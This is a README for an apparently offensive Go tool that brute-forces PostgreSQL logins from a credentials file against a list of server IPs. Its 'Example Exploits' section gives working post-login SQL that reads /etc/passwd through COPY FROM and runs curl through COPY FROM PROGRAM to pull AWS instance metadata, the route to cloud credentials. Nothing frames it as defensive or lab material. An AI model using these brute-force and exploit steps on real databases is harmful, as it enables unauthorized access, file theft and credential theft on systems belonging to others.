# postgres-bruteforcer

About
---

This Go script reads a list of usernames and passwords from a file called `creds.txt` and tests them against a PostgreSQL database. 

The script accepts an IP of the PostgreSQL server as a command line argument or a text file of ip's. 

If an access is granted, the script writes this output to a file called `pg-output.txt`.

If the user `postgres` is avalible this is normally a super user which can allow RCE or LFI or SSRf.


How to install
---

```
go install -v github.com/RandomRobbieBF/postgres-bruteforcer@latest
```

How to run
---

```
go run postgres-brute.go 1.1.1.1

postgres

```


Example Exploits
----

Grab `/etc/passwd/`

```
CREATE TABLE myfile (input TEXT);
COPY myfile FROM '/etc/passwd';
SELECT input FROM myfile;
```

SSRF - Grab AWS Metadata

```
CREATE TABLE weather_json (cities TEXT);
COPY weather_json FROM PROGRAM 'curl -L http://169.254.169.254/latest/meta-data/';
SELECT weather_json FROM weather_json;
```


